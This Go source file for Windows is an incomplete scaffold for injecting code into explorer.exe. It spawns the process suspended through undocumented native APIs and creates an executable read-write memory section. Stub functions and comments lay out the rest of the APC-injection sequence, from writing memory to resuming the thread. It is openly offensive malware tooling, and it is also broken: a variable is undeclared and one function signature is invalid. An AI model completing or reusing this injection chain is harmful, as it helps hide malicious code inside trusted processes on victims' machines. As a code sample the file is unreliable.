package main

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

type ProcessBasicInformationStruct struct {
	Reserved1       uintptr
	PebBaseAddress  uintptr
	Reserved2       [2]uintptr
	UniqueProcessID uintptr
	// Undocumented:
	InheritedFromUniqueProcessID uintptr
}

func IsSysWow64(ntdll syscall.Handle) (bool, error) {
	var ppeb32 uintptr
	ppeb32Len := uint32(unsafe.Sizeof(ppeb32))
	ZwQueryInformationProcess, err := syscall.GetProcAddress(
		syscall.Handle(ntdll), "ZwQueryInformationProcess")
	if err != nil {
		return false, err
	}
	r, _, err := syscall.Syscall6(uintptr(ZwQueryInformationProcess),
		5,
		uintptr(windows.CurrentProcess()),        // ProcessHandle
		uintptr(windows.ProcessWow64Information), // ProcessInformationClass
		uintptr(unsafe.Pointer(&ppeb32)),         // ProcessInformation
		uintptr(ppeb32Len),                       // ProcessInformationLength
		uintptr(unsafe.Pointer(&ppeb32Len)),      // ReturnLength
		0)
	if r != 0 {
		log.Printf("ZwQueryInformationProcess ERROR CODE: %x", r)
		return false, err
	}
	//log.Printf("%x %x %x %s", r, a, ppeb32, err)
	if ppeb32 != 0 {
		return true, nil
	}
	return false, nil
}

const SEC_COMMIT = 0x08000000
const SECTION_WRITE = 0x2
const SECTION_READ = 0x4
const SECTION_EXECUTE = 0x8
const SECTION_RWX = SECTION_WRITE | SECTION_READ | SECTION_EXECUTE

func CreateNewSection(ntdll syscall.Handle) (uintptr, error) {
	var err error
	NtCreateSection, err := syscall.GetProcAddress(
		syscall.Handle(ntdll), "NtCreateSection")
	if err != nil {
		return 0, err
	}
	var section uintptr
	size := int64(0xF001F)
	r, a, err := syscall.Syscall9(uintptr(NtCreateSection),
		7,
		uintptr(unsafe.Pointer(&section)), // PHANDLE            SectionHandle,
		SECTION_RWX,                       // ACCESS_MASK        DesiredAccess,
		0,                                 // POBJECT_ATTRIBUTES ObjectAttributes,
		uintptr(unsafe.Pointer(&size)),    // PLARGE_INTEGER     MaximumSize,
		windows.PAGE_EXECUTE_READWRITE,    // ULONG              SectionPageProtection,
		SEC_COMMIT,                        // ULONG              AllocationAttributes,
		0,                                 // HANDLE             FileHandle
		0,
		0)
	if r != 0 {
		log.Printf("NtCreateSection ERROR CODE: %x", r)
		return 0, err
	}
	log.Printf("%x %x %s", r, a, err)
	if section == 0 {
		return 0, fmt.Errorf("NtCreateSection failed for unknown reason")
	}
	log.Printf("Section: %0x\n", section)
	return section, nil
}

func CreateProcessInt(kernel32 syscall.Handle, procPath string) error {
	//RtlDosPathNameToNtPathName_U
	CreateProcessInternalW, err := syscall.GetProcAddress(
		syscall.Handle(kernel32), "CreateProcessInternalW")
	if err != nil {
		log.Fatalln(err)
		return err
	}
	var si windows.StartupInfo
	var pi windows.ProcessInformation
	log.Println(procPath)
	r, a, err := syscall.Syscall12(uintptr(CreateProcessInternalW),
		12,
		0, // IN HANDLE hUserToken,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(procPath))), // IN LPCWSTR lpApplicationName,
		0,                                 // IN LPWSTR lpCommandLine,
		0,                                 // IN LPSECURITY_ATTRIBUTES lpProcessAttributes,
		0,                                 // IN LPSECURITY_ATTRIBUTES lpThreadAttributes,
		0,                                 // IN BOOL bInheritHandles,
		uintptr(windows.CREATE_SUSPENDED), // IN DWORD dwCreationFlags,
		0,                                 // IN LPVOID lpEnvironment,
		0,                                 // IN LPCWSTR lpCurrentDirectory,
		uintptr(unsafe.Pointer(&si)),      // IN LPSTARTUPINFOW lpStartupInfo,
		uintptr(unsafe.Pointer(&pi)),      // IN LPPROCESS_INFORMATION lpProcessInformation,
		0)                                 // OUT PHANDLE hNewToken)
	if r > 1 { // hack for error code invalid function
		log.Printf("CreateProcessInternalW ERROR CODE: %x", r)
		return err
	}
	log.Printf("%x %x %s", r, a, err)
	return nil
}

func MapViewOfSection(ntdll syscall.Handle) error {
	return nil
}

func UnMapViewOfSection(ntdll syscall.Handle) error {
	return nil
}

func AllocateVirtualMemory(ntdll syscall.Handle) error {
	return nil
}

func WriteVirtualMemory(ntdll syscall.Handle) error {
	return nil
}

func FreeVirtualMemory(ntdll syscall.Handle) error {
	return nil
}

func ProtectVirtualMemory(ntdll syscall.Handle) error {
	return nil
}

func QueueApcThread(ntdll syscall.Handle) error {
	return nil
}

func SetInformationThread(ntdll syscall.Handle) error {
	return nil
}

func ResumeThread()(ntdll syscall.Handle) error {
	return nil
}

func main() {
	var err error
	var targetProc string = "explorer.exe"
	ntdll, err := syscall.LoadLibrary("ntdll.dll")
	if err != nil {
		log.Fatalln(err)
		return
	}
	defer syscall.FreeLibrary(ntdll)
	kernel32, err := syscall.LoadLibrary("kernel32.dll")
	if err != nil {
		log.Fatalln(err)
		return
	}
	defer syscall.FreeLibrary(kernel32)
	isSysWow64, err := IsSysWow64(ntdll)
	if err != nil {
		log.Fatalln(err)
		return
	}
	systemRoot := filepath.VolumeName(os.Getenv("SYSTEMROOT")) + "\\"
	if isSysWow64 {
		log.Println("Is 32bit")
		targetProc = fmt.Sprintf("%sWindows\\SysWOW64\\%s", systemRoot, targetProc)
	} else {
		log.Println("Is 64bit")
		targetProc = fmt.Sprintf("%sWindows\\System32\\%s", systemRoot, targetProc)
	}

	err = CreateProcessInt(kernel32, targetProc)
	if err != nil {
		log.Fatalln(err)
		return
	}
	section, err = CreateNewSection(ntdll)
	if err != nil {
		log.Fatalln(err)
		return
	}

	// ZwMapViewOfSection
	// memcopy
	// ZwUnmapViewOfSection
	// NtAllocateVirtualMemory
	// ZwWriteVirtualMemory
	// NtProtectVirtualMemory
	// ZwFreeVirtualMemory
	// NtQueueApcThread
	// NtSetInformationThread
	// NtResumeThread
}
